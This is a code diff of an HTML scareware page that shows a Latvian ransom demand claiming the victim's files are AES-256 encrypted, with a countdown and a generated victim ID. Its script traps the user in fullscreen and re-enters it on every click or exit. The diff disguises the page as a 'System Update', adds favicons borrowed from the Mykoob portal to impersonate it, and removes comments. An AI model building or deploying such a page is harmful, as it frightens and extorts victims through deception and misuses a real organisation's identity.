@@ -3,7 +3,10 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>System Locked</title>
+<title>System Update</title>
+
+<link rel="icon" type="image/png" media="(prefers-color-scheme: dark)"  href="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" />
+<link rel="icon" type="image/png" media="(prefers-color-scheme: light)" href="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png" />
 
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -91,7 +94,7 @@ body {
 <div class="ransom-inner">
 <div class="ransom-title">Jūsu faili ir šifrēti</div>
 <p class="ransom-body">
-Visi jūsu dati ir šifrēti ar AES-256.<br />
+Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256.<br />
 Lai tos atgūtu, mums ir nepieciešams maksājums.
 </p>
 <p class="ransom-body">
@@ -131,15 +134,12 @@ function requestFullscreen() {
   }
 }
 
-/* Mēģina uzreiz pēc ielādes */
 requestFullscreen();
 
-/* Ja neizdevās → mēģina pēc pirmā klikšķa jebkur */
 document.addEventListener('click', function () {
   if (!document.fullscreenElement) requestFullscreen();
 });
 
-/* Ja lietotājs iziet no fullscreen → mēģina atgriezt */
 document.addEventListener('fullscreenchange', function () {
   if (!document.fullscreenElement) {
     setTimeout(requestFullscreen, 100);
@@ -157,7 +157,6 @@ if (!deadline || deadline < Date.now()) {
 const ransomTimerEl = document.getElementById('ransomTimer');
 const ransomIdEl    = document.getElementById('ransomId');
 
-/* ── ID ── */
 let id = localStorage.getItem(RANSOM_ID_KEY);
 if (!id) {
   id = Array.from({ length: 32 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
